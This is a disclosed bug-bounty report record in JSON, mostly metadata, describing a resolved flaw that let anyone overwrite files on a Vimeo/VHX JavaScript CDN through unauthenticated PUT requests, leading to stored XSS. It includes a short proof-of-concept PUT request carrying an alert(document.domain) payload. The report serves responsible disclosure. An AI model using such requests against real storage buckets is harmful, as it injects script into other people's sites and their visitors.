{"id":452559,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC80NTI1NTk=","url":"https://hackerone.com/reports/452559","title":"Possibility to overwrite any file in the vpe.cdn.vimeo.tv leads to the Stored XSS for the all customers on the embed.vhx.tv","state":"Closed","substate":"resolved","severity_rating":"high","readable_substate":"Resolved","created_at":"2018-11-29T14:55:03.102Z","submitted_at":"2018-11-29T14:55:03.102Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"sp1d3rs","url":"/sp1d3rs","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/079/690/6853ada3e124bdd8616b1be752223b558de38195_original.png/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a"},"is_me?":false,"cleared":true,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":1105,"url":"https://hackerone.com/vhx","handle":"vhx","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/001/105/64f95aecba02c461838a9a8c36e2953bfcca60e1_original.png/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a","medium":"https://profile-photos.hackerone-user-content.com/variants/000/001/105/64f95aecba02c461838a9a8c36e2953bfcca60e1_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"profile":{"name":"VHX","twitter_handle":"vhxtv","website":"https://www.vhx.tv","about":"We empower businesses to sell films, TV shows, web series and more  across multiple platforms."}},"has_bounty?":true,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"stage":4,"public":true,"visibility":"no-content","cve_ids":[],"singular_disclosure_disabled":true,"disclosed_at":"2019-07-10T19:12:30.179Z","bug_reporter_agreed_on_going_public_at":"2019-05-04T18:03:57.953Z","team_member_agreed_on_going_public_at":"2019-07-10T19:12:29.986Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"","vulnerability_information_html":"","bounty_amount":"1500.0","formatted_bounty":"$1,500","weakness":{"id":26,"name":"Improper Access Control - Generic"},"original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":null,"vote_count":66,"voters":["v8vito","securaji","kapytein","secator","mashoud1122","bl4de","spam404","sameerphad72","bohdansec","dhakal_ananda","and 56 more..."],"severity":{"rating":"high","author_type":"User"},"structured_scope":{"databaseId":12111,"asset_type":"URL","asset_identifier":"embed.vhx.tv","max_severity":"critical"},"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"can_edit_custom_fields_attributes":false,"activities":[{"id":3731710,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"","markdown_message":"","automated_response":false,"created_at":"2018-11-29T15:11:29.193Z","updated_at":"2018-11-29T15:22:37.117Z","actor":{"username":"sp1d3rs","cleared":true,"url":"/sp1d3rs","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/079/690/6853ada3e124bdd8616b1be752223b558de38195_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"vhx","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":3731897,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"","markdown_message":"","automated_response":false,"created_at":"2018-11-29T15:51:43.659Z","updated_at":"2018-11-29T15:51:43.659Z","actor":{"username":"tucvimeo","cleared":false,"url":"/tucvimeo","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"vhx","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":3731910,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"","markdown_message":"","automated_response":false,"created_at":"2018-11-29T15:52:28.160Z","updated_at":"2018-11-29T15:52:28.160Z","actor":{"url":"/vhx","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/001/105/64f95aecba02c461838a9a8c36e2953bfcca60e1_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"VHX"}},"bounty_amount":"100.0","bounty_currency":"usd","bonus_amount":"0.0","genius_execution_id":null,"team_handle":"vhx","collaborator":{"username":"sp1d3rs","url":"/sp1d3rs"},"actor_is_team_member":true,"actor_is_concealed_member":false},{"id":3753528,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"","markdown_message":"","automated_response":false,"created_at":"2018-12-03T18:51:25.923Z","updated_at":"2018-12-03T18:51:25.923Z","actor":{"username":"tucvimeo","cleared":false,"url":"/tucvimeo","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"vhx","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":3753689,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"","markdown_message":"","automated_response":false,"created_at":"2018-12-03T19:24:56.434Z","updated_at":"2018-12-03T19:27:58.911Z","actor":{"username":"sp1d3rs","cleared":true,"url":"/sp1d3rs","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/079/690/6853ada3e124bdd8616b1be752223b558de38195_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"vhx","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":3753905,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"","markdown_message":"","automated_response":false,"created_at":"2018-12-03T20:05:31.030Z","updated_at":"2018-12-03T20:05:31.030Z","actor":{"username":"tucvimeo","cleared":false,"url":"/tucvimeo","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"reporter":{"username":"sp1d3rs","url":"/sp1d3rs"},"genius_execution_id":null,"team_handle":"vhx","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":3788432,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"","markdown_message":"","automated_response":false,"created_at":"2018-12-07T21:53:00.584Z","updated_at":"2018-12-07T21:53:00.584Z","actor":{"url":"/vhx","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/001/105/64f95aecba02c461838a9a8c36e2953bfcca60e1_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"VHX"}},"bounty_amount":"1400.0","bounty_currency":"usd","bonus_amount":"0.0","genius_execution_id":null,"team_handle":"vhx","collaborator":{"username":"sp1d3rs","url":"/sp1d3rs"},"actor_is_team_member":true,"actor_is_concealed_member":false},{"id":3788469,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"","markdown_message":"","automated_response":false,"created_at":"2018-12-07T22:04:41.811Z","updated_at":"2018-12-07T22:04:41.811Z","actor":{"username":"sp1d3rs","cleared":true,"url":"/sp1d3rs","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/079/690/6853ada3e124bdd8616b1be752223b558de38195_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"vhx","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":3830091,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"","markdown_message":"","automated_response":false,"created_at":"2018-12-14T23:37:09.712Z","updated_at":"2018-12-14T23:37:09.712Z","actor":{"username":"sp1d3rs","cleared":true,"url":"/sp1d3rs","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/079/690/6853ada3e124bdd8616b1be752223b558de38195_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"vhx","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":3830793,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"","markdown_message":"","automated_response":false,"created_at":"2018-12-15T04:01:14.000Z","updated_at":"2018-12-15T04:01:14.000Z","actor":{"username":"tucvimeo","cleared":false,"url":"/tucvimeo","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"vhx","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":4742684,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2019-05-04T18:03:57.978Z","updated_at":"2019-05-04T18:03:57.978Z","first_to_agree":true,"actor":{"username":"sp1d3rs","cleared":true,"url":"/sp1d3rs","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/079/690/6853ada3e124bdd8616b1be752223b558de38195_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"vhx","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":4768566,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"","markdown_message":"","automated_response":false,"created_at":"2019-05-07T16:24:01.050Z","updated_at":"2019-05-07T16:24:01.050Z","actor":{"username":"tucvimeo","cleared":false,"url":"/tucvimeo","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"vhx","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":4770044,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"","markdown_message":"","automated_response":false,"created_at":"2019-05-07T19:15:32.538Z","updated_at":"2019-05-07T19:15:32.538Z","actor":{"username":"tucvimeo","cleared":false,"url":"/tucvimeo","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"vhx","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":5293257,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"","markdown_message":"","automated_response":false,"created_at":"2019-07-10T19:01:05.392Z","updated_at":"2019-07-10T19:01:05.392Z","actor":{"username":"tucvimeo","cleared":false,"url":"/tucvimeo","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"vhx","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":5293309,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2019-07-10T19:12:30.020Z","updated_at":"2019-07-10T19:12:30.020Z","actor":{"username":"tucvimeo","cleared":false,"url":"/tucvimeo","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"vhx","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":5293310,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","markdown_message":"","automated_response":false,"created_at":"2019-07-10T19:12:30.205Z","updated_at":"2019-07-10T19:12:30.205Z","actor":{"username":"tucvimeo","cleared":false,"url":"/tucvimeo","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"vhx","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":5293832,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"","markdown_message":"","automated_response":false,"created_at":"2019-07-10T20:21:10.047Z","updated_at":"2019-07-10T20:21:22.364Z","actor":{"username":"sp1d3rs","cleared":true,"url":"/sp1d3rs","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/079/690/6853ada3e124bdd8616b1be752223b558de38195_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"vhx","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":5293840,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"","markdown_message":"","automated_response":false,"created_at":"2019-07-10T20:22:58.570Z","updated_at":"2019-07-10T20:22:58.570Z","actor":{"username":"tucvimeo","cleared":false,"url":"/tucvimeo","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"vhx","actor_is_team_member":true,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"id":17146,"category":"team","content":"By modifying the Content-Type to be blank, during a PUT command, the researcher was able to upload files to the CDN. This has been resolved.","can_view?":true,"can_edit?":false,"content_html":"\u003cp\u003eBy modifying the Content-Type to be blank, during a PUT command, the researcher was able to upload files to the CDN. This has been resolved.\u003c/p\u003e\n"},{"id":12811,"category":"researcher","content":"It was possible to write (and overwrite) arbitrary files to the CDN ( `vpe.cdn.vimeo.tv` ) used for JS scripts delivery on the various in-scope assets using the PUT method with blank or application/octet-stream Content-Type. Any other Content-Type caused auth error from Google Cloud Storage side.\nExample:\n```\nPUT /something.js HTTP/1.1\nHost: vpe.cdn.vimeo.tv\nContent-Type: application/octet-stream\nContent-Length: 10\nConnection: close\n\nalert(document.domain)\n```\ncould create `something.js` with XSS payload or overwrite `something.js` if it already exist.\n\nThe issue was fixed fast. Thanks to the VHX team for the great experience, awesome communication and the bounty!","can_view?":true,"can_edit?":false,"content_html":"\u003cp\u003eIt was possible to write (and overwrite) arbitrary files to the CDN ( \u003ccode\u003evpe.cdn.vimeo.tv\u003c/code\u003e ) used for JS scripts delivery on the various in-scope assets using the PUT method with blank or application/octet-stream Content-Type. Any other Content-Type caused auth error from Google Cloud Storage side.\u003cbr\u003e\nExample:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003ePUT /something.js HTTP/1.1\nHost: vpe.cdn.vimeo.tv\nContent-Type: application/octet-stream\nContent-Length: 10\nConnection: close\n\nalert(document.domain)\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003ecould create \u003ccode\u003esomething.js\u003c/code\u003e with XSS payload or overwrite \u003ccode\u003esomething.js\u003c/code\u003e if it already exist.\u003c/p\u003e\n\n\u003cp\u003eThe issue was fixed fast. Thanks to the VHX team for the great experience, awesome communication and the bounty!\u003c/p\u003e\n"}]}